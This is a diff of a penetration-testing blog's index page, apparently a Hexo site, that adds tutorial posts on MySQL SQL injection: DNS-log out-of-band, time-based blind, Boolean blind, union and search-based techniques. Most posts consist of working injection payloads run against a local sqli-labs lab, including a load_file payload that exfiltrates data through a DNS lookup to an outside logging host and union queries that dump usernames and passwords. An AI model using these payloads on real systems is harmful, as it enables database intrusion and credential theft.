@@ -158,7 +158,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/18/Numberbasedsqlinjection/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/18/SQLInjectionDnsLog/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -172,7 +172,586 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2016/10/18/Numberbasedsqlinjection/" class="post-title-link" itemprop="url">Detection of Numeric-based SQL Injection</a>
+            <a href="/2016/11/18/SQLInjectionDnsLog/" class="post-title-link" itemprop="url">DNS Log Blind SQL Injection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-11-18 10:47:59" itemprop="dateCreated datePublished" datetime="2016-11-18T10:47:59-05:00">2016-11-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-19 10:53:51" itemprop="dateModified" datetime="2023-10-19T10:53:51-04:00">2023-10-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">DNS Log Blind SQL Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Sometimes, when injecting, you may not get direct feedback, or you may not be able to use time-based blind injection. In such cases, you can use out-of-band channels, which means using other protocols or channels, such as HTTP requests, DNS resolution, SMB services, to exfiltrate data. <strong><em>DNS log</em></strong> blind injection can reduce the number of requests sent and achieve injection with direct feedback.</p>
+<p><strong><em>DNS log</em></strong>: It stores domain name information on the DNS server, recording user access information for domains like <a target="_blank" rel="noopener" href="http://www.xxx.com/">www.xxx.com</a>.</p>
+<p><strong><em>Conditions for utilization</em></strong>:</p>
+<ol>
+<li><code>secure_file_priv</code> in mysql.ini must be empty.</li>
+<li>If <code>secure_file_priv</code> is null, importing and exporting are not allowed.</li>
+<li>If <code>secure_file_priv</code> is set to &#x2F;tmp, importing and exporting can only be done in the &#x2F;tmp directory.</li>
+<li>When <code>secure_file_priv</code> is empty, there are no restrictions, and importing and exporting are allowed.</li>
+</ol>
+<p><strong><em>Example</em></strong>:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and load_file(concat(&#x27;\\&#x27;, (select database()), &#x27;.27epx0.ceye.io\abc&#x27;))--+&quot;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/28/SQLInjectionTimeBasedBlind/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/28/SQLInjectionTimeBasedBlind/" class="post-title-link" itemprop="url">Time-Based Blind SQL Injection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-10-28 22:31:42" itemprop="dateCreated datePublished" datetime="2016-10-28T22:31:42-04:00">2016-10-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 20:37:49" itemprop="dateModified" datetime="2023-10-18T20:37:49-04:00">2023-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Time-Based Blind SQL Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Time-Based-Blind-SQL-Injection-Steps"><a href="#Time-Based-Blind-SQL-Injection-Steps" class="headerlink" title="Time-Based Blind SQL Injection Steps:"></a>Time-Based Blind SQL Injection Steps:</h1><ol>
+<li>First, check if an injection vulnerability exists.</li>
+<li>Next, determine the injection type: character-based, numeric-based, or search-based.</li>
+<li>Determine the available injection method; in this case, union injection and Boolean-based blind injection are not available:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and 1=1 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and 1=2 %23 (Page response is normal)</span><br><span class="line">?id=1&#x27; and sleep(5) %23  </span><br></pre></td></tr></table></figure>
+ Page experiences a 5-second delay, indicating the sleep function is injected into the database, confirming the presence of time-based blind injection.</li>
+<li>Start by obtaining the length of the database name:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 (5-second delay)</span><br><span class="line">?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 (No 5-second delay)</span><br></pre></td></tr></table></figure>
+This indicates that the database name has a length of 8 characters.</li>
+<li>Proceed to retrieve the database name character by character:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;n),sleep(5),1) %23</span><br></pre></td></tr></table></figure>
+These steps describe a method for performing time-based blind SQL injection to extract information about the database, such as the length of the database name and the characters that make up the name.</li>
+</ol>
+<h1 id="Example-of-Time-Based-Blind-SQL-Injection-Operation"><a href="#Example-of-Time-Based-Blind-SQL-Injection-Operation" class="headerlink" title="Example of Time-Based Blind SQL Injection Operation:"></a>Example of Time-Based Blind SQL Injection Operation:</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&quot; 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1\ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and 1=1 --+ 没有任何反应</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and sleep(5) %23 5秒钟后响应,说明是字符型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1 and sleep(5) %23  响应的比较快,说明不是数字型盲注</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;7),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((length(database())&gt;8),sleep(5),1) %23 不延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;114),sleep(5),1) %23 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((ascii(substr(database(),1,1))&gt;115),sleep(5),1) %23 不延时5秒,得出结论,第一个字符是s,以此类推</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;3,sleep(5),1) --+ 延时5秒</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-9/?id=1&#x27; and if((select count(*) from information_schema.tables where table_schema=database())&gt;4,sleep(5),1) --+ 不延时5秒</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/27/SQLInjectionBooleanBlind/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/27/SQLInjectionBooleanBlind/" class="post-title-link" itemprop="url">Boolean Blind SQL Injection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-10-27 20:20:57" itemprop="dateCreated datePublished" datetime="2016-10-27T20:20:57-04:00">2016-10-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 20:29:50" itemprop="dateModified" datetime="2023-10-18T20:29:50-04:00">2023-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection/" itemprop="url" rel="index"><span itemprop="name">Boolean Blind Sql Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Boolean-Blind-SQL-Injection-Method"><a href="#Boolean-Blind-SQL-Injection-Method" class="headerlink" title="Boolean Blind SQL Injection Method"></a>Boolean Blind SQL Injection Method</h1><ol>
+<li><p>First, obtain the length of the database name:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;n --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Next, retrieve the database name character by character:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (ascii(substr(database(),1,1))&gt;n) --+</span><br></pre></td></tr></table></figure>
+<p>Note: To determine the character at a specific position, you can use a binary search method.<br>To obtain the second character of the database name, simply change the position in the “substr” function.</p>
+</li>
+<li><p>Use Burp Suite’s Intruder module to iterate through the possibilities.</p>
+</li>
+<li><p>Obtain the number of tables:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>Retrieve the length of the tables.<br>These steps outline a method for conducting a blind Boolean-based SQL injection to gather information about a database, such as the database name and the number of tables.</p>
+</li>
+</ol>
+<h1 id="Example-of-Boolean-Blind-SQL-Injection-Operation"><a href="#Example-of-Boolean-Blind-SQL-Injection-Operation" class="headerlink" title="Example of Boolean Blind SQL Injection Operation"></a>Example of Boolean Blind SQL Injection Operation</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; </span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=1 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=2 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 3 --+  correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 4 --+  error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;7 --+   correct  database name&#x27;s length &lt;=8</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;8 --+   error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;114) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;115) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 4 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 100) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 101) --+</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/24/SQLInjectionUnion/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/24/SQLInjectionUnion/" class="post-title-link" itemprop="url">Union Sql Injection Detection Methods</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-10-24 19:11:44" itemprop="dateCreated datePublished" datetime="2016-10-24T19:11:44-04:00">2016-10-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 20:46:23" itemprop="dateModified" datetime="2023-10-18T20:46:23-04:00">2023-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/" itemprop="url" rel="index"><span itemprop="name">Union Sql Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Union-Sql-Injection-Detection-Methods"><a href="#Union-Sql-Injection-Detection-Methods" class="headerlink" title="Union Sql Injection Detection Methods"></a>Union Sql Injection Detection Methods</h1><ol>
+<li>First, check for the existence of an SQL injection vulnerability.</li>
+<li>Then, determine the injection type: character-based, numeric-based, or search-based.</li>
+<li>Use “order by” to further identify the number of columns:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+ (normal)</span><br><span class="line">?id=1&#x27; order by 4 --+ (error)</span><br></pre></td></tr></table></figure></li>
+<li>Once the number of columns is determined using “order by,” proceed to replace the display position with some MySQL functions.</li>
+<li>Retrieve the tables in the current database:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, table_name), version() from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></li>
+<li>After obtaining the tables, retrieve the columns in those tables:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, column_name), version() from information_schema.columns where able_schema=database() and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
+<li>Retrieve the data:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;, username), group_concat(&#x27;|&#x27;, password) from users--+</span><br></pre></td></tr></table></figure>
+These steps describe how an attacker can detect and exploit a SQL injection vulnerability to extract information from a database.</li>
+</ol>
+<h1 id="Example-of-Union-Sql-Injection-Operation"><a href="#Example-of-Union-Sql-Injection-Operation" class="headerlink" title="Example of Union Sql Injection Operation"></a>Example of Union Sql Injection Operation</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,table_name) ,version() from information_schema.tables where table_schema=database()--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,column_name),version() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, username,password from users --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;,username),group_concat(&#x27;|&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/23/SQLInjectionSearch-Based/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/23/SQLInjectionSearch-Based/" class="post-title-link" itemprop="url">Search-Based SQL Injection Detection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-10-23 19:57:41" itemprop="dateCreated datePublished" datetime="2016-10-23T19:57:41-04:00">2016-10-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 18:54:24" itemprop="dateModified" datetime="2023-10-18T18:54:24-04:00">2023-10-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Search-Based SQL Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Search-Based-Injection-Detection-Methods"><a href="#Search-Based-Injection-Detection-Methods" class="headerlink" title="Search-Based Injection Detection Methods:"></a>Search-Based Injection Detection Methods:</h1><ol>
+<li><p>Input the search keyword: </p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>  If an error occurs, there’s a high probability of a vulnerability.</p>
+</li>
+<li><p>Input the search keyword: </p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>  If an error occurs, there’s a high probability of a vulnerability.</p>
+</li>
+<li><p>Input the search keyword: </p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span> <span class="string">&#x27;and 1=1 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>  Observe the response.</p>
+</li>
+<li><p>Input the search keyword: </p>
+  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span> <span class="string">&#x27;and 1=2 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>  Observe the response.</p>
+</li>
+</ol>
+<h1 id="Search-Based-Injection-Detection-Statements"><a href="#Search-Based-Injection-Detection-Statements" class="headerlink" title="Search-Based Injection Detection Statements:"></a>Search-Based Injection Detection Statements:</h1>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=1--&#x27;</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27; </span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/20/SQLInjectionCharacter/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/20/SQLInjectionCharacter/" class="post-title-link" itemprop="url">Character-based SQL Injection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-10-20 21:55:22" itemprop="dateCreated datePublished" datetime="2016-10-20T21:55:22-04:00">2016-10-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-18 18:55:32" itemprop="dateModified" datetime="2023-10-18T18:55:32-04:00">2023-10-18</time>
